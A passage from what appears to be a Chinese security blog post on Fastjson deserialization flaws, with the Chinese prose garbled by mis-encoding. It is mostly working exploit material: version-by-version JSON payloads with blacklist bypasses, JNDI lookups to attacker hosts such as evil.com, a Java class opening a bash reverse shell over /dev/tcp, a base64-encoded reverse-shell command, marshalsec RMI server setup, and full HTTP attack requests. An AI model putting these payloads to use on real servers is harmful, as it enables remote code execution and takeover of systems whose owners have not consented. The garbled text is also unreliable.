å°‘ä¸èƒ½å¤š key,</span><br><span class="line">æ‰€ä»¥ä¼šæŠ¥é”™,æœåŠ¡å™¨çš„å“åº”åŒ…ä¸­å¤šå°‘ä¼šæœ‰å¼‚å¸¸å›æ˜¾</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>dosæ£€æµ‹ dos</span><br><span class="line">&#123;<span class="string">&quot;a:&quot;</span>\x çœ‹è¿”å›æ—¶é—´</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>å¦‚æœæ˜¯jsonå­—ç¬¦ä¸²ä¸­nameå­—æ®µå­˜åœ¨ååºåˆ—åŒ–</span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;wangwei&quot;</span>&#125;é‚£ä¹ˆpocå°±æ˜¯</span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;name&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://fatjaon.tuq75v.ceye.io&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:true&#125;&#125;</span><br><span class="line"></span><br><span class="line">å°tips</span><br><span class="line"><span class="number">1.</span>åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°åªè¦å›æ˜¾æ¯”è¾ƒæ…¢ï¼Œæˆ–è€…æ„Ÿè§‰å¡é¡¿éƒ½æœ‰å¯èƒ½æ˜¯æ­£åœ¨æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥æ¯”è¾ƒæ…¢</span><br><span class="line"><span class="number">2.</span>poc.javaæ–‡ä»¶ç”¨ä½ç‰ˆæœ¬çš„javaç¯å¢ƒç¼–è¯‘ï¼Œå› ä¸ºjavaæ˜¯å‘ä¸‹å…¼å®¹çš„ï¼Œé˜²æ­¢ç›®æ ‡ç¯å¢ƒåŠ è½½çš„æ—¶å€™è¿è¡ŒæŠ¥é”™ï¼Œæœ€å¥½æ˜¯jdk1<span class="number">.6</span></span><br></pre></td></tr></table></figure><h1 id="0x02-fastjson-ååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#0x02-fastjson-ååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="0x02 fastjson ååºåˆ—åŒ–æ¼æ´åŸç†"></a>0x02 fastjson ååºåˆ—åŒ–æ¼æ´åŸç†</h1><p><img src="/2022/498480683/image.png" alt="img"> </p><h2 id="åè¯è§£é‡Š"><a href="#åè¯è§£é‡Š" class="headerlink" title="åè¯è§£é‡Š"></a>åè¯è§£é‡Š</h2><p><strong>@type</strong></p><blockquote><p>æŒ‡å®šçš„è§£æç±»ï¼Œå³<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>ï¼ŒFastjsonæ ¹æ®æŒ‡å®šç±»å»ååºåˆ—åŒ–å¾—åˆ°è¯¥ç±»çš„å®ä¾‹ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹åªä¼šå»ååºåˆ—åŒ–publicä¿®é¥°çš„å±æ€§ï¼Œåœ¨pocä¸­ï¼Œ<code>_bytecodes</code>ä¸<code>_name</code>éƒ½æ˜¯ç§æœ‰å±æ€§ï¼Œæ‰€ä»¥è¦æƒ³ååºåˆ—åŒ–è¿™ä¸¤ä¸ªï¼Œéœ€è¦åœ¨<code>parseObject()</code>æ—¶è®¾ç½®<code>Feature.SupportNonPublicField</code></p></blockquote><h2 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h2><p>å› ä¸ºä¸è®©å±æ€§ï¼Œæ‰¾é”™ç±»å‹<code>@type</code>  å¼•å…¥äº†<code>autotype</code> ï¼Œ<code>com.sun.rowset.JdbcRowSetImpl </code>ä¸€å®šä¼šè¢«è¯»å–åŠ è½½</p><p><code>com.sun.rowset.JdbcRowSetImpl</code>æ˜¯ä¸ªæ¶æ„ç±»ï¼Œé»˜è®¤å¯¹å±æ€§ä¸åšä»»ä½•å¤„ç†ï¼Œå¯¼è‡´äº†ååºåˆ—åŒ–ï¼Œå¯ä»¥ä»»æ„æ‰§è¡Œå‘½ä»¤</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exp 1.2.24</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h2><p>æ—¢1.2.25ç‰ˆæœ¬ä¹‹åè®¾ç½®äº†<code>autoTypeSupport</code>å±æ€§é»˜è®¤ä¸º<code>false</code>ï¼Œå¹¶ä¸”å¢åŠ äº†<code>checkAutoType()</code>å‡½æ•°ï¼Œä¿®å¤æ˜¯ç”¨äº†ç™½åå•ï¼Œåé¢æ˜¯é€šè¿‡ç»•è¿‡ç™½åå•æ¥è¿›è¡Œæ”»å‡»çš„<code>com.sun.rowset.JdbcRowSetImpl</code>åœ¨1.2.25ç‰ˆæœ¬è¢«åŠ å…¥äº†é»‘åå•ï¼Œfastjsonæœ‰ä¸ªåˆ¤æ–­æ¡ä»¶åˆ¤æ–­ç±»åæ˜¯å¦ä»¥â€<code>L</code>â€å¼€å¤´ã€ä»¥â€<code>;</code>â€ç»“å°¾ï¼Œæ˜¯çš„è¯å°±æå–å‡ºå…¶ä¸­çš„ç±»åå†åŠ è½½è¿›æ¥ï¼Œå› æ­¤åœ¨åŸç±»åå¤´éƒ¨åŠ <code>L</code>ï¼Œå°¾éƒ¨åŠ <code>;</code>å³å¯ç»•è¿‡é»‘åå•çš„åŒæ—¶åŠ è½½ç±»ã€‚</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>autoTypeSupport</code>å±æ€§ä¸º<code>true</code>æ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;=1.2.25é»˜è®¤ä¸ºfalseï¼‰</p><h2 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h2><p>å¦‚æœè¾“å…¥ç±»åçš„å¼€å¤´å’Œç»“å°¾æ˜¯<code>L</code>å’Œ<code>;</code>å°±å°†å¤´å’Œå°¾å»æ‰ï¼Œå†è¿›è¡Œé»‘åå•éªŒè¯ã€‚ è¿˜æŠŠé»‘åå•çš„å†…å®¹è¿›è¡Œäº†åŠ å¯†ï¼Œé»‘åå•åŒ…ç±»ï¼š<a href="https://github.com/LeadroyaL/fastjson-blacklist%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%8C%E5%9C%A8%E7%B1%BB%E5%90%8D%E5%A4%96%E9%83%A8%E5%B5%8C%E5%A5%972%E5%B1%82L;%E3%80%82">https://github.com/LeadroyaL/fastjson-blacklist </a>ç»•è¿‡æ–¹æ³•ï¼Œåœ¨ç±»åå¤–éƒ¨åµŒå¥—2å±‚<code>L;</code>åŸç±»åï¼š<code>com.sun.rowset.JdbcRowSetImpl</code> ç»•è¿‡ï¼š<code> LLcom.sun.rowset.JdbcRowSetImpl;;</code></p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;=1.2.25é»˜è®¤ä¸ºfalseï¼‰</p><h2 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h2><p>fastjsonåœ¨1.2.43ä¸­<code>checkAutoType()</code>å‡½æ•°å¢åŠ åˆ¤æ–­å¼€å¤´ä¸º<code>LL</code>ç›´æ¥æŠ¥é”™ã€‚ ç»•è¿‡æ–¹æ³•: æ ¹æ®fastjsonåˆ¤æ–­å‡½æ•°ï¼Œ<code>[</code>å¼€å¤´åˆ™æå–ç±»åï¼Œä¸”åé¢å­—ç¬¦å­—ç¬¦ä¸ºâ€<code>[</code>â€œã€â€<code>&#123;</code>â€œç­‰ï¼Œå³å¯æ­£å¸¸è°ƒç”¨</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://test.com:9999/TouchFile&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;=1.2.25é»˜è®¤ä¸ºfalseï¼‰</p><h2 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h2><p>å‰ææ¡ä»¶ï¼šéœ€è¦ç›®æ ‡æœåŠ¡ç«¯å­˜åœ¨<code>mybatis</code>çš„jaråŒ…ï¼Œä¸”ç‰ˆæœ¬éœ€ä¸º<code>3.x.x</code>ç³»åˆ—<code>&lt;3.5.0</code>çš„ç‰ˆæœ¬ã€‚ ä½¿ç”¨é»‘åå•ç»•è¿‡ï¼Œ<code>org.apache.ibatis.datasource</code>åœ¨<code>1.2.46</code>ç‰ˆæœ¬è¢«åŠ å…¥äº†é»‘åå• ç”±äºåœ¨é¡¹ç›®ä¸­ä½¿ç”¨çš„é¢‘ç‡ä¹Ÿè¾ƒé«˜ï¼Œæ‰€ä»¥å½±å“èŒƒå›´è¾ƒå¤§ã€‚</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;=1.2.25é»˜è®¤ä¸ºfalseï¼‰</p><h2 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h2><p>å¯¹ç‰ˆæœ¬å°äº1.2.48çš„ç‰ˆæœ¬é€šæ€ï¼Œ<code>autoType</code>ä¸ºå…³é—­çŠ¶æ€ä¹Ÿå¯ä½¿ç”¨ã€‚ <code>loadClass</code>ä¸­é»˜è®¤<code>cache</code>è®¾ç½®ä¸º<code>true</code>ï¼Œ</p><p>(1)é¦–å…ˆä½¿ç”¨<code>java.lang.Class</code>æŠŠè·å–åˆ°çš„ç±»ç¼“å­˜åˆ°<code>mapping</code>ä¸­ï¼Œ</p><p>(2)ç›´æ¥ä»ç¼“å­˜ä¸­è·å–åˆ°äº†<code>com.sun.rowset.JdbcRowSetImpl</code>è¿™ä¸ªç±»ï¼Œç»•è¿‡äº†é»‘åå•æœºåˆ¶ã€‚</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://evil.com:9999/Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h2><p>åŸºäºé»‘åå•ç»•è¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,</span><br><span class="line">  <span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span></span><br><span class="line">&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure><h2 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h2><p>å…³äºfastjson&lt;=1.2.66ç½‘ä¸Šç›¸å…³çš„åˆ©ç”¨ä¸å¤š,æ”¶é›†åˆ°çš„å‡ ä¸ªexpï¼Œä¹Ÿæ˜¯åŸºäºé»‘åå•ç»•è¿‡ã€‚</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,</span><br><span class="line">  <span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>autoTypeSupportå±æ€§ä¸ºtrueæ‰èƒ½ä½¿ç”¨ã€‚ï¼ˆfastjson&gt;=1.2.25é»˜è®¤ä¸ºfalseï¼‰</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247486298&amp;idx=1&amp;sn=6c0377e574db63eab2423187240d799c&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247486298&amp;idx=1&amp;sn=6c0377e574db63eab2423187240d799c&amp;scene=21#wechat_redirect</a></p><p><a href="https://www.bilibili.com/video/BV1Ab4y1d7w1?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click">https://www.bilibili.com/video/BV1Ab4y1d7w1?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click</a></p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p><h1 id="0x03-Fastjson-æ¼æ´åˆ©ç”¨æ–¹å¼"><a href="#0x03-Fastjson-æ¼æ´åˆ©ç”¨æ–¹å¼" class="headerlink" title="0x03 Fastjson æ¼æ´åˆ©ç”¨æ–¹å¼"></a>0x03 Fastjson æ¼æ´åˆ©ç”¨æ–¹å¼</h1><p>ç¼–å†™EXP-&gt;å¯åŠ¨pythonæœåŠ¡å™¨-&gt;å¯åŠ¨rmi ç›‘å¬-&gt; å‘é€poc-&gt;æˆåŠŸåå¼¹shell</p><p>éœ€è¦ Java ç¯å¢ƒ</p><h3 id="ç¼–è¯‘EXP"><a href="#ç¼–è¯‘EXP" class="headerlink" title="ç¼–è¯‘EXP"></a>ç¼–è¯‘EXP</h3><p>å°†ä»£ç ç¼–å†™ä¸ºclassç±»æ–‡ä»¶ï¼Œå¹¶å°†ç”Ÿæˆçš„ç±»æ–‡ä»¶æ”¾åœ¨webç›®å½•ä¸‹ï¼Œå¹¶å¯åŠ¨webæœåŠ¡</p><p><a href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p><p>EXPç¼–ç  <code>bash -c &#123;echo,YmFzaCAtaSA+JiAgL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/127.0.0.1/1234 0&gt;&amp;1&quot;</span>&#125;);<span class="comment">//éœ€è¦è¿›è¡Œ base64 ç¼–ç </span></span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ EXP å¹¶å¯åŠ¨ python æœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç¼–è¯‘</span></span><br><span class="line">javac Exploit.java</span><br><span class="line"><span class="comment"># python æœåŠ¡</span></span><br><span class="line">python3 -m http.server 8001</span><br></pre></td></tr></table></figure><h3 id="é…ç½®RMIç¯å¢ƒ"><a href="#é…ç½®RMIç¯å¢ƒ" class="headerlink" title="é…ç½®RMIç¯å¢ƒ"></a>é…ç½®RMIç¯å¢ƒ</h3><p>ç”¨marshalsecé¡¹ç›®ï¼Œå¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œç›‘å¬9999ç«¯å£ï¼Œå¹¶åŠ è½½è¿œç¨‹ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/mbechler/marshalsec.git</span></span><br><span class="line">cd marshalsec/</span><br><span class="line">mvn install</span><br><span class="line">mvn clean <span class="keyword">package</span> â€“DskipTests</span><br><span class="line">cd target/</span><br></pre></td></tr></table></figure><h3 id="å¯åŠ¨RMIæœåŠ¡ç›‘å¬"><a href="#å¯åŠ¨RMIæœåŠ¡ç›‘å¬" class="headerlink" title="å¯åŠ¨RMIæœåŠ¡ç›‘å¬"></a>å¯åŠ¨RMIæœåŠ¡ç›‘å¬</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://1.1.1.1:8888/#Exploit&quot;</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure><p>å¤‡æ³¨ï¼š<a href="http://xx.xx.xx.xx:9999/#POC">http://xx.xx.xx.xx:9999/#POC</a> æ˜¯æ”¾Javaç±»çš„åœ°å€ï¼Œç±»åªè¦å†™åå­—å³å¯ï¼Œä¸éœ€è¦åŠ .classï¼Œå…¶æ¬¡ç±»åå‰è¦åŠ #</p><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><p>æŠŠç½‘ç«™jsonæ•°æ®åŒ…æ›¿æ¢ï¼Œç„¶åå‘åŒ…ï¼ŒVPSå³å¯æ”¶åˆ°</p><p>è¿™é‡Œçš„EXP æ ¹æ®Fastjson ç‰ˆæœ¬ä¸åŒï¼Œè¿›è¡Œæ›¿æ¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8090</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 260</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    &quot;a&quot;:&#123;</span></span><br><span class="line"><span class="comment">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span></span><br><span class="line"><span class="comment">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"><span class="comment">    &#125;,</span></span><br><span class="line"><span class="comment">    &quot;b&quot;:&#123;</span></span><br><span class="line"><span class="comment">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span></span><br><span class="line"><span class="comment">        &quot;dataSourceName&quot;:&quot;rmi://2.2.2.2:9999/Exploit&quot;,</span></span><br><span class="line"><span class="comment">        &quot;autoCommit&quot;:true</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="0x04-å„ä¸ªç‰ˆæœ¬åˆ©ç”¨"><a href="#0x04-å„ä¸ªç‰ˆæœ¬åˆ©ç”¨" class="headerlink" title="0x04 å„ä¸ªç‰ˆæœ¬åˆ©ç”¨"></a>0x04 å„ä¸ªç‰ˆæœ¬åˆ©ç”¨</h1><h2 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson 1.2.24"></a>fastjson 1.2.24</h2><p>å¦‚æœå¼¹shell éœ€è¦å…ˆæ­å»º rmi æœåŠ¡å™¨</p><p>å°†<code>127.0.0.1</code> æ¢æˆrmiæœåŠ¡å™¨åœ°å€ <code>8653</code> ä¸ºrmi æœåŠ¡å™¨ç«¯å£</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>you-ip:port</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;b&quot;</span>:&#123;</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:8653/Exp&quot;</span>,</span></span><br><span class="line"><span class="json">        <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="json">    &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="fastjson-1-2-47"><a 